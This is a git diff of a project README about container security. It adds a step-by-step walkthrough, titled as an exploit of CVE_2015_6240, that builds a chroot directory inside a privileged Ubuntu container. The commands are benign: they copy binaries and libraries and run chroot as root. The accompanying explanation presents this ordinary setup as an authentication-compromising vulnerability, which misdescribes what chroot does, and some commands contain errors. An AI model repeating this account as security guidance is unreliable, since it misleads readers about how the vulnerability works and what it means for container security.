@@ -83,7 +83,7 @@ CVE reports:
 
 ![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/policy.JPG)  
 
-## Exploiting Vulnerabilities on the Docker Debian Image
+## Exploiting Vulnerabilities on Docker Containers
 
 Samples provided-  
 1. Rancher Server: 
@@ -94,3 +94,65 @@ https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules
 https://github.com/opencontainers/runc/issues/2128  
 
 Other CVE details- https://www.cvedetails.com/vendor/13534/Docker.html
+
+### Exploiting Chroot (Change root) CVE_2015_6240
+
+In this vulnerability, a hacker can create his own new root directory, different from the original, or gain access to the directory, for which he previously had write access. The below steps describe how this vulnerability can be exploited by an unauthorized user:  
+
+1. Invoke and Run the ubuntu bionic 18.04 docker container from the Windows Powershell by pulling its image from Docker Hub 
+
+		docker run -it --name docker-host --rm --privileged ubuntu:bionic
+
+2. Check the ubuntu version of the container after you are in root
+
+		cat /etc/issue/
+
+![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/ubuntu_version.JPG) 
+
+3. Create a new folder for your new root directory from the original
+
+		mkdir /my-new-root                                                                                      
+
+4. Create a new file within the new root directory titled secret.txt
+
+		 echo "my super secret thing" >> /my-new-root/secret.txt                                                                          
+
+5. To ensure that a bash file is present for the new root directory copy it from the original
+
+		cp /bin/bash /bin/ls /my-new-root/bin/                                                                              
+
+Also, add create lib and lib64 directories to bash to contain libraries for x86 and 64 bit systems:
+
+		mkdir /my-new-root/lib /my-new-root/lib64                                                                                
+
+6. To copy the libraries within bash, first list them out:
+
+		ldd /bin/bash                                                                                     
+
+![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/bin_bash.JPG)
+
+7. Then copy them to the new root directory /lib and /lib64 
+
+		cp /lib/x86_64-linux-gnu/libtinfo.so.5 /lib/x86_64-linux-gnu/libdl.so.2 /lib/x86_64-linux-gnu/libc.so.6 /my-new-root/lib                                                                         
+
+		cp /lib64/ld-linux-x86-64.so.2 /my-new-root/lib64                                                                                
+
+8. Repeat the same with the files listed in ls
+
+		ldd /bin/ls                 
+
+![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/bin_ls.JPG)
+
+		cp /lib/x86_64-linux-gnu/libtinfo.so.5 /lib/x86_64-linux-gnu/libdl.so.2 /lib/x86_64-linux-gnu/libc.so.6 /my-new-root/lib                                                                         
+
+		cp /lib/x86_64-linux-gnu/libpthread.so.0 /my-new-root/lib               
+
+		cp /lib64/ld-linux-x86-64.so.2 /my-new-root/lib64 
+
+9. Change the current root directory by running the command chroot
+
+		chroot /my-new-root bash 
+
+10. To see the contents of the new root directory, use ls. Everything in the original directory can be seen here. But when we try to check the present working directory it shows /, implying that it considers the new root directory as the actual one, instead of the original, and there is no way of navigating back to it, leading to a compromise on authentication and hence, a vulnerability. 
+
+![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/jail.JPG)
